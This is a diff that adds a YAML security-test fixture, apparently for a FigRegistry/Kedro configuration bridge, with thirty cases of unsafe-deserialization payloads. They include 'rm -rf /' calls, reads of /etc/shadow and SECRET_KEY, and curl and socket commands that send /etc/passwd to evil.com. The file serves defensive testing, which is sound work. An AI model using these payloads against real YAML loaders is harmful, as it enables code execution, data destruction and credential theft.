@@ -1,0 +1,261 @@
+# Malicious YAML Configuration for Security Testing
+# This file contains comprehensive YAML injection attempts and deserialization exploits
+# to validate FigRegistryConfigBridge security boundaries per Section 6.6.8.1
+#
+# WARNING: This is a TEST FILE containing malicious content designed to test security
+# controls. It should NEVER be used as an actual configuration file.
+
+# Test Case 1: Python Object Constructor Injection
+# Attempts to execute arbitrary code through unsafe YAML constructors
+figregistry_version: !!python/object/apply:subprocess.call ['rm -rf /']
+metadata:
+  config_version: !!python/object/apply:os.system ['whoami']
+  created_by: !!python/object/apply:eval ['__import__("os").system("echo pwned")']
+  description: !!python/object/apply:exec ['import subprocess; subprocess.call(["curl", "evil.com/steal_data"])']
+
+# Test Case 2: Direct Code Execution Vectors
+# Various attempts to inject executable code through YAML deserialization
+styles:
+  malicious_exec: !!python/object/apply:__builtin__.exec ['print("SECURITY_BREACH_DETECTED")']
+  eval_injection: !!python/object/apply:builtins.eval ['1+1; import os; os.system("ls -la")']
+  import_injection: !!python/object/apply:__import__ ['subprocess']
+  code_object: !!python/object/new:types.CodeType [0, 0, 0, 0, b'', (), (), (), '', '', 0, b'']
+
+# Test Case 3: Pickle Deserialization Attacks
+# Attempts to exploit pickle deserialization vulnerabilities
+defaults:
+  figure:
+    # Base64 encoded pickle payload that would execute system commands
+    figsize: !!python/object/apply:pickle.loads [!!binary |
+      gASVOwAAAAAAAABjX19idWlsdGluX19fCmV2YWwKcQBYGAAAAGltcG9ydCBvcywgb3Muc3lzdGVt
+      KCdscycpcQGFcQJScQMu]
+    dpi: !!python/object/apply:base64.b64decode ['aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImVjaG8gSEFDS0VEIik=']
+
+# Test Case 4: Remote Code Execution through Configuration Bridge
+# Targets the configuration merging process with malicious payloads
+kedro:
+  config_bridge:
+    merge_strategy: !!python/object/apply:sys.exit [1]
+    enabled: !!python/object/apply:os.getcwd []
+  datasets:
+    default_purpose: !!python/object/apply:shutil.rmtree ['/tmp']
+
+# Test Case 5: Condition Parameter Manipulation
+# Exploits condition parameter resolution for code injection
+condition_parameters:
+  experiment_condition: !!python/object/apply:eval ['__import__("subprocess").call(["echo", "injected"])']
+  experiment_phase: !!python/object/apply:compile ['exec("import sys; sys.exit()")', '<string>', 'exec']
+  analysis_stage: !!python/object/apply:open ['/etc/passwd', 'r']
+  model_type: !!python/object/apply:input ['Enter password: ']
+
+# Test Case 6: Style Parameter Exploitation
+# Attempts to inject code through style configuration parameters
+palettes:
+  malicious_palette: !!python/object/apply:urllib.request.urlopen ['http://evil.com/exfiltrate']
+  evil_colors: !!python/object/apply:socket.socket []
+
+# Test Case 7: Output Path Traversal and Code Execution
+# Combines path traversal with code execution attempts
+outputs:
+  base_path: !!python/object/apply:os.chdir ['../../../']
+  naming:
+    template: !!python/object/apply:tempfile.mkdtemp []
+    timestamp_format: !!python/object/apply:time.sleep [10]
+  formats:
+    defaults:
+      exploratory: !!python/object/apply:os.listdir ['/']
+      presentation: !!python/object/apply:glob.glob ['/*']
+
+# Test Case 8: YAML Anchor and Reference Manipulation
+# Uses YAML anchors/aliases to create complex attack vectors
+anchor_attack: &malicious_anchor !!python/object/apply:subprocess.Popen ['echo exploit', 'shell']
+style_inheritance:
+  enabled: *malicious_anchor
+  hierarchy: !!python/object/apply:marshal.loads [!!binary 'invalid_marshal_data']
+
+# Test Case 9: Complex Object Construction Attacks
+# Advanced object construction for bypassing simple filters
+conditional_rules:
+  wildcard_patterns: !!python/object/new:subprocess.Popen
+    - ['cat', '/etc/shadow']
+    - stdin: !!python/name:subprocess.PIPE
+      stdout: !!python/name:subprocess.PIPE
+      stderr: !!python/name:subprocess.PIPE
+  partial_matching: !!python/object/apply:threading.Thread
+    - {}
+    - target: !!python/name:os.system
+      args: ['rm -rf /tmp/*']
+
+# Test Case 10: Module Import and Attribute Access Exploitation
+# Attempts to import dangerous modules and access system functions
+performance:
+  cache_enabled: !!python/module:sys
+  max_cache_size: !!python/object:types.ModuleType ['malicious_module']
+  target_merge_time_ms: !!python/object/apply:getattr [!!python/name:os, 'system']
+
+# Test Case 11: Environment Variable and System Information Leakage
+# Attempts to access sensitive environment and system information
+validation:
+  strict_mode: !!python/object/apply:os.getenv ['SECRET_KEY']
+  required_fields: !!python/object/apply:platform.platform []
+  schema_version: !!python/object/apply:getpass.getuser []
+
+# Test Case 12: File System Manipulation Attacks
+# Advanced file system access and manipulation attempts
+examples:
+  basic:
+    exploit_attempt: !!python/object/apply:open ['/dev/urandom', 'rb']
+    file_read: !!python/object/apply:pathlib.Path.read_text [!!python/object/new:pathlib.Path ['/etc/hosts']]
+  advanced:
+    directory_listing: !!python/object/apply:os.walk ['/root']
+    permission_escalation: !!python/object/apply:os.setuid [0]
+
+# Test Case 13: Network and Socket Exploits
+# Network-based exploitation attempts
+malicious_network:
+  socket_creation: !!python/object/new:socket.socket [2, 1]  # AF_INET, SOCK_STREAM
+  url_fetch: !!python/object/apply:urllib.request.urlopen ['https://malicious-site.com/payload']
+  dns_lookup: !!python/object/apply:socket.gethostbyname ['attacker.com']
+
+# Test Case 14: Thread and Process Exploitation
+# Attempts to create unauthorized processes and threads
+malicious_execution:
+  thread_spawn: !!python/object/new:threading.Thread
+    - []
+    - target: !!python/name:os.system
+      args: ['curl -X POST -d @/etc/passwd http://evil.com/exfil']
+  process_creation: !!python/object/new:multiprocessing.Process
+    - []
+    - target: !!python/name:subprocess.call
+      args: [['python', '-c', 'import socket; s=socket.socket(); s.connect(("evil.com",1234))']]
+
+# Test Case 15: Serialization Format Confusion
+# Mixed serialization attacks targeting different deserializers
+serialization_confusion:
+  json_in_yaml: !!python/object/apply:json.loads ['{"malicious": "payload"}']
+  yaml_in_pickle: !!python/object/apply:yaml.load ['!!python/object/apply:os.system ["echo nested_attack"]']
+  base64_confusion: !!python/object/apply:codecs.decode ['aW1wb3J0IG9z', 'base64']
+
+# Test Case 16: Memory and Resource Exhaustion
+# Attempts to cause denial of service through resource exhaustion
+resource_attacks:
+  memory_bomb: !!python/object/apply:list [!!python/object/apply:range [1000000]]
+  infinite_recursion: &recursive_ref [*recursive_ref]
+  file_descriptor_leak: !!python/object/apply:open ['/dev/null'] # Without close()
+
+# Test Case 17: Dynamic Code Compilation and Execution
+# Advanced code compilation and execution vectors
+dynamic_execution:
+  compile_attack: !!python/object/apply:compile ['exec("import os; os.system(\'id\')")', '<string>', 'exec']
+  eval_with_globals: !!python/object/apply:eval 
+    - 'exec("import subprocess; subprocess.call([\"whoami\"])")'
+    - !!python/dict {'__builtins__': !!python/name:__builtins__}
+  code_object_exec: !!python/object/apply:exec [!!python/object/new:types.CodeType [
+    0, 0, 0, 0, 0, 0, 
+    !!binary 'ZABkAWwAWgBkAmwBWgFlAGoCC2QDgwFkAFMATgQpBXUHAAAAdQdwYWNrYWdldQRvcyBzdXJwcm9jZXNzdQhjYWxs', 
+    (), (), (), '<exploit>', '<module>', 1, !!binary '']]
+
+# Test Case 18: Class and Method Manipulation
+# Attempts to manipulate Python classes and methods
+class_manipulation:
+  metaclass_attack: !!python/object/new:type
+    - 'MaliciousClass'
+    - [!!python/name:object]
+    - {'__init__': !!python/name:os.system}
+  method_override: !!python/object/new:dict
+    args: [['__class__', !!python/name:subprocess.Popen]]
+  descriptor_attack: !!python/object/apply:property [!!python/name:os.getcwd]
+
+# Test Case 19: Exception and Error Handling Exploitation
+# Exploits through exception handling mechanisms
+exception_exploitation:
+  exception_with_payload: !!python/object/new:Exception
+    - ['Malicious payload']
+    - {'__cause__': !!python/object/apply:os.system ['echo exception_exploit']}
+  custom_exception: !!python/object/new:SystemExit [!!python/object/apply:os.getpid []]
+
+# Test Case 20: Generator and Iterator Exploitation
+# Advanced exploitation using Python generators and iterators
+generator_attacks:
+  malicious_generator: !!python/object/apply:map [!!python/name:os.system, ['echo mapped_attack']]
+  iterator_exploit: !!python/object/apply:filter [!!python/name:exec, ['import sys; sys.exit()']]
+  zip_attack: !!python/object/apply:zip [!!python/object/apply:iter [['cat', '/etc/passwd']]]
+
+# Test Case 21: Context Manager Exploitation
+# Attempts to exploit Python context managers
+context_manager_attacks:
+  file_context: !!python/object/apply:open ['/dev/mem', 'rb']
+  custom_context: !!python/object/new:contextlib.closing
+    - [!!python/object/apply:socket.socket []]
+
+# Test Case 22: Weak Reference and Garbage Collection Exploitation
+# Advanced memory management exploitation
+memory_attacks:
+  weak_reference: !!python/object/apply:weakref.ref [!!python/name:os.system]
+  gc_manipulation: !!python/object/apply:gc.collect []
+  finalizer_attack: !!python/object/apply:weakref.finalize 
+    - [!!python/name:sys]
+    - !!python/name:os.system
+    - 'echo finalizer_exploit'
+
+# Test Case 23: Encoding and Decoding Attacks
+# Various encoding/decoding based attack vectors
+encoding_attacks:
+  rot13_obfuscation: !!python/object/apply:codecs.decode ['vzcbeg bf; bf.flfgrz("rpub ebg13")', 'rot13']
+  hex_encoding: !!python/object/apply:bytes.fromhex ['696d706f7274206f733b206f732e73797374656d2822656368682068657822']
+  unicode_escape: !!python/object/apply:str.encode ['\\x69\\x6d\\x70\\x6f\\x72\\x74', 'unicode_escape']
+
+# Test Case 24: Lambda and Functional Programming Exploitation
+# Exploitation through functional programming constructs
+functional_attacks:
+  lambda_exploit: !!python/object/apply:builtins.eval ['lambda: os.system("echo lambda_attack")']
+  partial_function: !!python/object/apply:functools.partial [!!python/name:subprocess.call, ['echo', 'partial_attack']]
+  reduce_attack: !!python/object/apply:functools.reduce 
+    - !!python/name:operator.add
+    - [!!python/object/apply:chr [111], !!python/object/apply:chr [115]]  # 'os'
+
+# Test Case 25: Regular Expression and Pattern Exploitation
+# Regex-based exploitation attempts
+regex_attacks:
+  re_compile: !!python/object/apply:re.compile ['.*', !!python/object/apply:os.system ['echo regex_attack']]
+  pattern_injection: !!python/object/apply:re.search 
+    - '.*'
+    - !!python/object/apply:subprocess.check_output [['echo', 'pattern_exploit']]
+
+# Test Case 26: Database and SQL Injection Simulation
+# Simulated database-related attacks (even though this is file-based)
+database_simulation:
+  sql_injection: "'; DROP TABLE users; --"
+  nosql_injection: {'$where': '!!python/object/apply:os.system ["echo nosql"]'}
+  command_injection: "$(rm -rf /tmp)"
+
+# Test Case 27: Path Traversal and Directory Manipulation
+# File system path traversal attempts
+path_traversal:
+  relative_path: "../../../etc/passwd"
+  absolute_path: "/etc/shadow"
+  windows_path: "..\\..\\..\\windows\\system32\\config\\sam"
+  null_byte: "../../etc/passwd\x00.jpg"
+  unicode_traversal: "..%2f..%2f..%2fetc%2fpasswd"
+
+# Test Case 28: Time-based and Side-channel Attacks
+# Timing and side-channel attack simulations
+timing_attacks:
+  sleep_attack: !!python/object/apply:time.sleep [5]
+  busy_wait: !!python/object/apply:time.perf_counter []
+  timing_oracle: !!python/object/apply:hashlib.pbkdf2_hmac ['sha256', b'password', b'salt', 100000]
+
+# Test Case 29: Protocol and Format Confusion
+# Mixed protocol and format confusion attacks
+protocol_confusion:
+  ftp_url: "ftp://user:pass@evil.com/malicious_file"
+  file_url: "file:///etc/passwd"
+  data_url: "data:text/plain;base64,aW1wb3J0IG9z"
+  javascript_url: "javascript:alert('xss')"
+
+# Test Case 30: Cryptographic and Hashing Exploitation
+# Cryptographic function misuse attempts
+crypto_attacks:
+  hash_collision: !!python/object/apply:hashlib.md5 [b'collision_attempt']
+  random_seed: !!python/object/apply:random.seed [42]
+  crypto_key: !!python/object/apply:os.urandom [32]
